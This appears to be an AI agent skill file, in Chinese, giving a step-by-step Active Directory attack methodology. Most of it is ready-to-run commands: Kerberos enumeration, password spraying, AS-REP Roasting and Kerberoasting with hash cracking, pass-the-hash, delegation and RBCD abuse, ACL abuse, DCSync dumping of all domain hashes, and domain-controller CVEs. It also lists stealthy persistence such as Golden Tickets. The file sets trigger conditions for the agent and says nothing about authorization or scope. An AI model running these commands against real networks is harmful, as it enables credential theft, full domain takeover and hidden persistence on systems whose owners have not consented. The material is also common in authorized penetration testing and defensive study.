---
name: ad-domain-attack
description: "Active Directory 域环境攻击全链路。当目标主机在域环境中（systeminfo 显示 Domain 非 WORKGROUP）、发现 88/389/636 端口、或获取到域用户凭据时使用。覆盖域信息收集、用户枚举、Kerberoasting、AS-REP Roasting、委派攻击、ACL 滥用、DCSync、Golden/Silver Ticket"
metadata:
  tags: "ad,domain,kerberos,kerberoasting,asrep,delegation,dcsync,golden ticket,acl,域,域控,横向移动,ntlm,bloodhound"
  difficulty: "hard"
  icon: "🏰"
  category: "横向移动"
---

# AD 域攻击方法论

Active Directory 域渗透是内网渗透的核心。域环境中所有认证和授权都通过域控集中管理——拿下域控 = 控制整个网络。

## Phase 1: 域环境确认与信息收集

### 1.1 确认域环境
```bash
# Windows
systeminfo | findstr /i "domain"
net config workstation
nltest /dclist:DOMAIN_NAME

# Linux (已加入域或有域凭据)
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN
```

域控 IP 通常就是 DNS 服务器（`ipconfig /all` 中的 DNS Server）。

### 1.2 域基础枚举（无需凭据）
```bash
# Kerberos 用户枚举（通过 AS-REQ 判断用户是否存在）
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt

# LDAP 匿名绑定（某些域控允许）
netexec ldap DC_IP -u '' -p '' --users
netexec ldap DC_IP -u '' -p '' --groups
```

### 1.3 域深度枚举（需要域用户凭据）
获取到任意域用户凭据后：
```bash
# 用户列表、组成员、密码策略
netexec ldap DC_IP -u USER -p PASS --users
netexec ldap DC_IP -u USER -p PASS --groups
net accounts /domain    # 密码策略（锁定阈值！）

# SPN 枚举（Kerberoasting 目标）
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP

# BloodHound 数据采集（最全面的域信息收集）
bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c all
```

BloodHound 能自动发现攻击路径，是域渗透最强大的工具。

## Phase 2: 凭据攻击

### 2.1 密码喷洒
**先查密码策略**：`net accounts /domain` 看锁定阈值和重置时间。
```bash
# 一次只喷一个密码
netexec smb DC_IP -u userlist.txt -p 'Company2024!' --continue-on-success
```
常见密码模式：公司名+年份+符号、季节+年份、Welcome1!

### 2.2 AS-REP Roasting
针对不需要 Kerberos 预认证的用户（无需凭据即可攻击）：
```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

### 2.3 Kerberoasting
针对注册了 SPN 的服务账户（需要任意域用户凭据）：
```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt wordlist.txt
```
服务账户密码通常比用户密码更弱（设置后很少更改）。

## Phase 3: 横向移动与权限提升

### 3.1 凭据复用
用获取的凭据测试其他主机：
```bash
netexec smb 10.0.0.0/24 -u USER -p PASS --continue-on-success
netexec winrm 10.0.0.0/24 -u USER -p PASS
# PTH
netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH
```

### 3.2 委派攻击

**非约束委派**：
委派主机可以代替任何用户向任何服务认证。诱导域管连接到委派主机 → 获取域管 TGT。
```bash
# 查找非约束委派主机
impacket-findDelegation DOMAIN/USER:PASS -dc-ip DC_IP
# 或 netexec ldap DC_IP -u USER -p PASS -M find-delegation
```

**约束委派**：
服务可以代替用户向指定服务认证。如果控制了约束委派服务 → 可以模拟任意用户访问目标服务。
```bash
impacket-getST -spn TARGET_SPN -impersonate administrator DOMAIN/SERVICE_USER:PASS -dc-ip DC_IP
```

**基于资源的约束委派 (RBCD)**：
如果你能修改目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性：
```bash
# 添加一个你控制的机器账户
impacket-addcomputer DOMAIN/USER:PASS -computer-name 'FAKE$' -computer-pass 'Password123!'
# 设置 RBCD
impacket-rbcd DOMAIN/USER:PASS -delegate-from 'FAKE$' -delegate-to TARGET$ -action write -dc-ip DC_IP
# 获取票据
impacket-getST -spn cifs/TARGET -impersonate administrator DOMAIN/'FAKE$':'Password123!' -dc-ip DC_IP
```

### 3.3 ACL 滥用
BloodHound 中常见的危险 ACL 路径：
| 权限 | 可以做什么 |
|------|-----------|
| GenericAll | 重置密码、修改组成员、设置 RBCD |
| GenericWrite | 修改属性（设置 SPN → Kerberoasting） |
| WriteDACL | 给自己授予 GenericAll |
| WriteOwner | 修改对象所有者 → 再修改 DACL |
| ForceChangePassword | 直接重置目标密码 |
| AddMember | 将自己加入特权组 |

### 3.4 其他提权路径
- **LAPS**：`netexec ldap DC_IP -u USER -p PASS -M laps` — 读取本地管理员密码
- **GPP 密码**：`netexec smb DC_IP -u USER -p PASS -M gpp_password` — 组策略中的密码
- **ADCS 攻击**：`certipy find -u USER -p PASS -dc-ip DC_IP` — 证书服务滥用（ESC1-ESC8）

## Phase 4: 域控攻击

### 4.1 DCSync
需要域管权限或 Replicating Directory Changes 权限：
```bash
impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
# 获取所有用户的 NTLM 哈希，包括 krbtgt
```

### 4.2 高危 CVE（直接攻击域控）
- **ZeroLogon (CVE-2020-1472)**：将域控机器密码重置为空，获取域管权限
- **PrintNightmare (CVE-2021-1675)**：远程代码执行
- **noPac (CVE-2021-42278/42287)**：普通域用户→域管
- **ADCS ESC8 (PetitPotam)**：强制域控认证到攻击者 → 中继获取域控证书

## Phase 5: 持久化

| 方法 | 条件 | 隐蔽性 |
|------|------|--------|
| Golden Ticket | krbtgt 哈希 | 高（10 年有效期） |
| Silver Ticket | 服务账户哈希 | 高（不经过域控） |
| DCSync 后门 | 域管权限 | 低（给用户加 DCSync 权限） |
| AdminSDHolder | 域管权限 | 中（60 分钟自动恢复 ACL） |
| 机器账户 | 域用户即可 | 高（RBCD 后门） |

## 工具速查
| 场景 | 推荐工具 |
|------|----------|
| 域枚举 | BloodHound, netexec |
| 票据攻击 | impacket 套件 |
| 密码破解 | hashcat |
| 漏洞利用 | certipy (ADCS), zerologon 脚本 |
